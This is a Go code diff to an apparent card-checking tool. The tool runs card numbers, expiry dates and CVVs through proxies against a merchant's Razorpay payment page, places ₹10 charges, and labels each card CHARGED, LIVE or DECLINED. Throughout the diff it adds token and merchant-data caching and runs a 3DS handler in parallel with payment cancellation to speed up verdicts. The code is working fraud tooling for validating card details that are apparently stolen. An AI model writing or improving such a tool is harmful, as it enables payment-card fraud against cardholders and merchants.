@@ -9,6 +9,7 @@ import (
 	"net/url"
 	"regexp"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -30,6 +31,63 @@ type razorpayMerchantSite struct {
 var razorpayMerchantSites = []razorpayMerchantSite{
 	// pages.razorpay.com sites — confirmed working (HTTP-only, no browser)
 	{"https://pages.razorpay.com/10DUM", "https://pages.razorpay.com", 1000}, // ₹10, Entri
+}
+
+// ─────────────── Cache: session token + merchant data ────────────────
+
+var (
+	cachedSessionToken   string
+	cachedSessionTokenAt time.Time
+	sessionTokenMu       sync.Mutex
+
+	cachedMerchantData   *razorpayMerchantData
+	cachedMerchantDataAt time.Time
+	merchantDataMu       sync.Mutex
+
+	cacheTTL = 5 * time.Minute
+)
+
+func getCachedSessionToken(proxyURL string) (string, error) {
+	sessionTokenMu.Lock()
+	if cachedSessionToken != "" && time.Since(cachedSessionTokenAt) < cacheTTL {
+		t := cachedSessionToken
+		sessionTokenMu.Unlock()
+		return t, nil
+	}
+	sessionTokenMu.Unlock()
+
+	token, err := fetchSessionToken(proxyURL)
+	if err != nil {
+		return "", err
+	}
+
+	sessionTokenMu.Lock()
+	cachedSessionToken = token
+	cachedSessionTokenAt = time.Now()
+	sessionTokenMu.Unlock()
+	return token, nil
+}
+
+func getCachedMerchantData(proxyURL string) (*razorpayMerchantData, error) {
+	merchantDataMu.Lock()
+	if cachedMerchantData != nil && time.Since(cachedMerchantDataAt) < cacheTTL {
+		md := cachedMerchantData
+		merchantDataMu.Unlock()
+		return md, nil
+	}
+	merchantDataMu.Unlock()
+
+	site := razorpayMerchantSites[0]
+	md, err := fetchMerchantData(site.URL, site.Origin, site.AmountPaise, proxyURL)
+	if err != nil {
+		return nil, err
+	}
+
+	merchantDataMu.Lock()
+	cachedMerchantData = md
+	cachedMerchantDataAt = time.Now()
+	merchantDataMu.Unlock()
+	return md, nil
 }
 
 // ─────────────── Merchant data ──────────────────────────────────────
@@ -521,38 +579,29 @@ func checkRazorpayCard(cc, mm, yy, cvv, proxyURL string) *CheckResult {
 		}
 	}
 
-	// Step 1: Fetch session token
-	sessionToken, err := fetchSessionToken(proxyURL)
+	// Step 1: Get cached session token
+	sessionToken, err := getCachedSessionToken(proxyURL)
 	if err != nil {
 		fmt.Printf("[RAZ] card=%s step=session_token err=%v\n", card, err)
 		return fail("SESSION_TOKEN_FAIL")
 	}
 
-	// Step 2: Try each merchant site until order creation succeeds
-	var md *razorpayMerchantData
-	var orderID string
-	for i, site := range razorpayMerchantSites {
-		md, err = fetchMerchantData(site.URL, site.Origin, site.AmountPaise, proxyURL)
-		if err != nil {
-			fmt.Printf("[RAZ] card=%s step=merchant_data site=%s err=%v\n", card, site.URL, err)
-			continue
-		}
-		fmt.Printf("[RAZ] card=%s step=merchant_data site=%s ok key_id=%s plid=%s ppi=%s amount=%d\n", card, site.URL, md.KeyID, md.PaymentLinkID, md.PaymentPageItem, md.AmountPaise)
-
-		client := newCookieClient(proxyURL, 30*time.Second)
-
-		orderID, err = createOrder(client, md)
-		if orderID != "" {
-			return processRazorpayPayment(card, cc, mm, yy, cvv, md, sessionToken, orderID, client, proxyURL)
-		}
-
-		fmt.Printf("[RAZ] card=%s step=create_order site=%s failed err=%v\n", card, site.URL, err)
-		if i < len(razorpayMerchantSites)-1 {
-			fmt.Printf("[RAZ] card=%s trying next site...\n", card)
-		}
+	// Step 2: Get cached merchant data
+	md, err := getCachedMerchantData(proxyURL)
+	if err != nil {
+		fmt.Printf("[RAZ] card=%s step=merchant_data err=%v\n", card, err)
+		return fail("ALL_SITES_FAILED")
 	}
 
-	return fail("ALL_SITES_FAILED")
+	// Step 3: Create order + process payment
+	client := newCookieClient(proxyURL, 30*time.Second)
+	orderID, err := createOrder(client, md)
+	if orderID == "" {
+		fmt.Printf("[RAZ] card=%s step=create_order failed err=%v\n", card, err)
+		return fail("ALL_SITES_FAILED")
+	}
+
+	return processRazorpayPayment(card, cc, mm, yy, cvv, md, sessionToken, orderID, client, proxyURL)
 }
 
 func processRazorpayPayment(card, cc, mm, yy, cvv string, md *razorpayMerchantData, sessionToken, orderID string, client *http.Client, proxyURL string) *CheckResult {
@@ -652,50 +701,63 @@ func processRazorpayPayment(card, cc, mm, yy, cvv string, md *razorpayMerchantDa
 	}
 
 	// ── 3DS redirect path (browser-based) ──
-	// Open the 3DS redirect URL in a headless browser. The page auto-submits
-	// a form to the bank's 3DS page via JavaScript. Some banks do "frictionless
-	// 3DS" (auto-approve for small amounts) — the browser captures that as CHARGED.
+	// Run solver and cancel in parallel. Whichever gives a definitive
+	// answer first wins. Most declined cards get the cancel result in
+	// ~2s without waiting for the full 8-10s solver cycle.
 	fmt.Printf("[RAZ] card=%s step=3ds_browser redirect_url=%s\n", card, redirectURL)
 
-	tdsResult := handle3DSRedirect(redirectURL, proxyURL)
-
-	// Check if the browser detected a successful charge
-	if tdsResult.Charged {
-		fmt.Printf("[RAZ] card=%s step=3ds_result CHARGED (frictionless)\n", card)
-		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
+	type solverOutcome struct {
+		result *razorpay3DSResult
+	}
+	type cancelOutcome struct {
+		data map[string]interface{}
 	}
 
-	// Try status check (may work if the bank processed it)
-	time.Sleep(1 * time.Second)
-	finalStatus, statusData := checkPaymentStatus(client, md, sessionToken, paymentID)
-	fmt.Printf("[RAZ] card=%s step=status_check status=%s\n", card, finalStatus)
+	solverCh := make(chan solverOutcome, 1)
+	cancelCh := make(chan cancelOutcome, 1)
 
-	if finalStatus == "captured" || finalStatus == "authorized" {
-		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
-	}
+	go func() {
+		solverCh <- solverOutcome{result: handle3DSRedirect(redirectURL, proxyURL)}
+	}()
+	go func() {
+		cancelCh <- cancelOutcome{data: cancelPayment(client, md, sessionToken, paymentID)}
+	}()
 
-	if finalStatus == "failed" {
-		errDesc := ""
-		if ed, ok := statusData["error_description"].(string); ok && ed != "" {
-			errDesc = ed
-		}
-		if errObj, ok := statusData["error"].(map[string]interface{}); ok {
-			if d, ok := errObj["description"].(string); ok && d != "" {
-				errDesc = d
+	// Wait for either solver or cancel to give a definitive answer
+	for {
+		select {
+		case so := <-solverCh:
+			if so.result != nil && so.result.Charged {
+				fmt.Printf("[RAZ] card=%s step=3ds_result CHARGED (frictionless)\n", card)
+				return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
 			}
+			// Solver not charged — wait for cancel
+			co := <-cancelCh
+			rawCancel, _ := json.Marshal(co.data)
+			fmt.Printf("[RAZ] card=%s step=cancel response=%s\n", card, string(rawCancel))
+			tag, reason := determineTagFromCancel(co.data)
+			return buildCancelResult(card, amtStr, tag, reason)
+
+		case co := <-cancelCh:
+			rawCancel, _ := json.Marshal(co.data)
+			fmt.Printf("[RAZ] card=%s step=cancel response=%s\n", card, string(rawCancel))
+			tag, reason := determineTagFromCancel(co.data)
+			// If cancel gives a definitive DECLINED, return immediately
+			if tag == "DECLINED" {
+				return buildCancelResult(card, amtStr, tag, reason)
+			}
+			// Otherwise wait for solver to check if charged
+			so := <-solverCh
+			if so.result != nil && so.result.Charged {
+				fmt.Printf("[RAZ] card=%s step=3ds_result CHARGED (frictionless)\n", card)
+				return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
+			}
+			return buildCancelResult(card, amtStr, tag, reason)
 		}
-		if errDesc == "" {
-			errDesc = "Payment failed"
-		}
-		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "DECLINED > " + strings.ToUpper(errDesc), Gateway: razorpayGatewayName}
 	}
+}
 
-	// Cancel and inspect the cancel response
-	cancelData := cancelPayment(client, md, sessionToken, paymentID)
-	rawCancel, _ := json.Marshal(cancelData)
-	fmt.Printf("[RAZ] card=%s step=cancel response=%s\n", card, string(rawCancel))
-	tag, reason := determineTagFromCancel(cancelData)
-
+func buildCancelResult(card, amtStr, tag, reason string) *CheckResult {
 	switch tag {
 	case "LIVE":
 		return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "3DS_REQUIRED", Gateway: razorpayGatewayName}
